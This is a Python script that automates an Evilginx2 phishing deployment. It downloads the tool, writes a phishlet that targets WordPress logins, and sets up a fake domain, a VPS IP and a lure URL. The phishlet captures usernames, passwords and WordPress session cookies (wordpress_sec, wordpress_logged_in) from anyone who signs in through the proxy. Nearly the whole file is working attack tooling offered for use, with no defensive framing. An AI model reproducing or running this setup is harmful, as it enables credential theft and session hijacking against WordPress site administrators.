import os
import subprocess
import requests
import pexpect
import textwrap
import re

def get_latest_evilginx_release():
    url = "https://api.github.com/repos/kgretzky/evilginx2/releases/latest"
    response = requests.get(url)
    response.raise_for_status()
    data = response.json()
    for asset in data['assets']:
        if "linux" in asset['name'] and asset['name'].endswith("linux-64bit.zip"):
            return asset['browser_download_url'], asset['name']
    raise Exception("No suitable Evilginx release found.")

def main():
    # Prompt user for config
    phishlet_name = input("Enter the phishlet name (e.g. hackingwithj): ").strip()
    phishlet_domain = input("Enter the phishlet domain (e.g. hackingwithj.com): ").strip()
    your_domain = input("Enter your fake domain (e.g. hackingwithj.cam): ").strip()
    external_ip = input("Enter your VPS IP address: ").strip()

    phishlet_file = f"phishlets/{phishlet_name}.yaml"

    evilginx_zip_url, filename = get_latest_evilginx_release()
    print(f"[+] Downloading Evilginx: {filename}")

    subprocess.run(["wget", evilginx_zip_url, "-O", filename], check=True)

    print("[+] Extracting Evilginx...")
    subprocess.run(["unzip", "-o", filename], check=True)

    os.remove(filename)
    os.chmod("./evilginx", 0o755)

    print("[+] Writing WordPress phishlet...")
    phishlet_content = textwrap.dedent(f"""\
    ---
    name: {phishlet_name}
    author: '@j'
    min_ver: '2.3.0'

    proxy_hosts:
      - phish_sub: ''
        orig_sub: ''
        domain: {phishlet_domain}
        session: true
        is_landing: true

    sub_filters: []

    auth_tokens:
      - domain: {phishlet_domain}
        keys:
        - 'wordpress_sec_.*,regexp'
        - 'wordpress_logged_in_.*,regexp'

    auth_urls:
      - '.*/wp-admin/.*'

    credentials:
      username:
        key: 'log'
        search: '(.*)'
        type: 'post'
      password:
        key: 'pwd'
        search: '(.*)'
        type: 'post'

    login:
      domain: {phishlet_domain}
      path: '/wp-login.php'
    """)

    os.makedirs("phishlets", exist_ok=True)
    with open(phishlet_file, "w") as f:
        f.write(phishlet_content)

    print(f"[+] Phishlet written to {phishlet_file}")

    print("[*] Launching Evilginx and sending config commands...")

    try:
        child = pexpect.spawn("./evilginx", encoding='utf-8', timeout=20)

        child.expect(":")
        child.sendline(f"config domain {your_domain}")
        child.expect(":")
        child.sendline(f"config ipv4 external {external_ip}")
        child.expect(":")
        child.sendline(f"phishlets hostname {phishlet_name} {your_domain}")
        child.expect(":")
        child.sendline(f"phishlets enable {phishlet_name}")

        child.expect(":")
        child.sendline(f"lures create {phishlet_name}")
        child.expect(r"created lure with ID: (\d+)")
        lure_output = child.after
        print(f"[DEBUG] Lure creation output:\n{lure_output}")

        lure_id = re.search(r"created lure with ID: (\d+)", lure_output)
        if lure_id:
            lure_id = lure_id.group(1)
            print(f"[+] Lure created with ID: {lure_id}")

            child.sendline(f"lures get-url {lure_id}")
            child.expect(":")
            url_output = child.before
            url_match = re.search(r"https?://[^\s]+", url_output)
            if url_match:
                print(f"[+] Lure URL: {url_match.group(0)}")
            else:
                print("[-] Failed to extract lure URL.")
        else:
            print("[-] Failed to extract lure ID.")

        print("[+] Evilginx is configured successfully!")
        child.interact()

    except pexpect.exceptions.TIMEOUT as e:
        print("[!] Timeout exceeded during configuration.")
        print(str(e))
    except pexpect.exceptions.EOF as e:
        print("[!] Evilginx exited unexpectedly.")
        print(str(e))


if __name__ == "__main__":
    main()
